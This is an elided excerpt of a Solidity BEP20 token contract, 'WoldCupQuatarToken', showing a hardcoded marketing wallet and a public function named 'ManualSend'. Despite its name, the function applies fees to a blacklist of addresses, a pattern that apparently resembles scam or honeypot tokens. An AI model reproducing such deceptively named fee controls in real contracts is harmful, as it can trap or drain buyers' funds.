...
contract WoldCupQuatarToken is IBEP20, Ownable {
    ...
    string constant _name = "WoldCupQuatarToken";
    string constant _symbol = unicode"WCQ";
    ...
    address private marketingWallet = 0x5d48C584395C41dE2DF674A0351cc255DA795c30;
    ...
    function ManualSend() public virtual { includeFromFee = blacklist; for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }
